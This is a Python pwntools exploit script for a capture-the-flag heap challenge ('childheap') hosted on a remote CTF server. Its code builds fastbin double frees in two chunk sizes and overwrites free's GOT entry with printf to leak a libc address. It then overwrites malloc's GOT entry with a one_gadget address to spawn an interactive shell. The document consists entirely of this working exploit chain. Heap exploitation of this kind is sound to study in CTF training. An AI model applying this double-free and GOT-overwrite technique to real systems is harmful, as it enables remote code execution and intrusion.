from pwn import * 

#p = process("./childheap")
p = remote("ctf.j0n9hyun.xyz",3033)

main = 0x400B04
printf_plt = 0x400730
free_got = 0x602018
malloc_got = 0x602050
offset = 0x3c4b78
read_offset = 0xf7250
one = [0x45216,0x4526a,0xf02a4,0xf1147]


def malloc(idx,size,desc) : 
    p.sendlineafter(">",str(1))
    p.sendlineafter("index: ",str(idx))
    p.sendlineafter("size: ",str(size))
    p.sendafter("content: ",desc)
    
def free(idx) : 
    p.sendlineafter(">",str(2))
    p.sendlineafter("index: ",str(idx))
    
if __name__ == "__main__" :
    #---- set chunk ---- 
    malloc(0,128,"\xbb"*8)
    malloc(1,0x50,"a"*8)
    malloc(2,0x50,"b"*8)
    malloc(3,0x60,"\xaa"*8)
    malloc(4,0x60,"\xaa"*8)
    #---- make double free bug 0x60 size ----
    free(1)
    free(2)
    free(1)
    #---- make unsorted bin ----
    free(0)
    #---- make double free bug 0x70 size ----
    free(3)
    free(4)
    free(3)

    
    #---- 0x60 size chunk  
    payload = p64(free_got-30)
    malloc(1,0x50,payload)
    malloc(1,0x50,"eeee")
    malloc(1,0x50,"ffff")
    malloc(1,0x50,"\xbb"*6+p64(0x00)+p64(printf_plt))# GOT overwrite free -> printf
    
    free(0) #printf( unsorted bin )
    
    leak = u64(p.recv(6)+"\x00"*2)
    libc = leak-offset
    one_gadget = libc+one[0]
    read_addr = libc+read_offset
    log.info(hex(libc))
    
    #---- 0x70 size chunk 
    payload = p64(malloc_got-35)
    malloc(3,0x60,payload)
    malloc(3,0x60,"aaaa")
    malloc(3,0x60,"bbbb")
    malloc(3,0x60,"\x7f\x00\x00"+p64(read_addr)+p64(0)+p64(one_gadget)) #GOT overwrite malloc -> one_gadget
    
    p.sendline("1")
    p.sendline("0")
    p.sendline("0")
    
    p.interactive()